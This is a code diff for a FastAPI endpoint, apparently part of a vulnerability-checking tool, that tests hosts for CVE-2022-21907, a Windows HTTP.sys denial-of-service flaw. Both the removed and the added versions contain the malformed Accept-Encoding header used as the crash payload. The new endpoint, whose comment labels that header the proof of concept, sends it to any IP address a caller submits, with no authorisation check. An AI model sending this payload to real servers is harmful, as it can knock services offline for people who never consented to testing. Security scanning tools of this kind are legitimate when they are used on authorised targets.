@@ -1,45 +1,46 @@
-from fastapi import APIRouter
-import nmap
+from fastapi import APIRouter, HTTPException
+from pydantic import BaseModel
+import requests
 
 router = APIRouter()
 
+class Ip_Target(BaseModel):
+    ip_address: str
 
+tags_cve_2022_21907 = ['cve_2022_21907']
 
-def check_cve_2022_21907(target):
-    nm = nmap.PortScanner()
-    target_port = 80
+@router.post('/api/check-cve-2022-21907', tags=[tags_cve_2022_21907])
+async def scan_host(host_data: Ip_Target):
+    host = host_data.ip_address
 
-    def check_vulnerability(host, port):
-        headers = {
-            "accept-encoding": "AAAAAAAAAAAAAAAAAAAA, AAAAAAAAAAAAAAAAAAAAAAAAA" +
-                               "BBBBBBBBBBBBBBBBBBBBBBBBBBB&AAAA&**BBBBBBBBBBBBBBBBBb**BBBBBBBBBB, " +
-                               "CCCCC**CCCCCCCCCCCCCCCCC,CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" +
-                               "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC, " +
-                               "DDDDDDDDDDDDDDDDDDDd,DDDDDDDDDDDDDDDDDDD,************DDDDDDDDDDDD, " +
-                               "DDDDDDD****************DDDDDDDD, *, ,"
-        }
-
-        try:
-            response = nm.request_http(target, port, "/", headers=headers)
-
-            if response and 'status' in response:
-                if response['status'] is None:
-                    return "CVE-2022-21907 - DOS: Likely Vulnerable"
-        except Exception as e:
-            pass
-
-        return "CVE-2022-21907 - DOS: Not Vulnerable"
-
-    nm.scan(hosts=target, ports=str(target_port), arguments="-Pn")
-    host_status = nm[target]['status']['state']
-
-    if host_status == 'up':
-        result = check_vulnerability(target, target_port)
-        return f"{target}:{target_port} - {result}"
-    else:
-        return f"{target}:{target_port} - Host is down"
+    print("Sending specially crafted malicious requests, please wait...")
     
-@router.post("/check-cve")
-async def check_cve(target_ip: str):
-    result = check_cve_2022_21907(target_ip)
-    return {"result": result}
+    # Đây là PoC
+    headers = {
+   'Accept-Encoding':
+   'AAAAAAAAAAAAAAAAAAAAAAAA,\
+	 BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S,\
+	 RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF,\
+	 TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP,\
+	 OOOAOAOOOAOOAOOOAOOOAOOOAOO,\
+	 ****************************stupiD, *, ,',
+    }
+
+    # Gửi request
+    try: 
+        reponse = requests.get(f'http://{host}', headers=headers) # Lấy payload ở PoC trên
+        reponse.raise_for_status()
+        return {"response_test": reponse.text}
+    except requests.exceptions.RequestException as e:
+        raise HTTPException(status_code=500,detail=f"An error occurred: {e}" )
+
+    
+
+
+    
+    
+    
+         
+
+
+
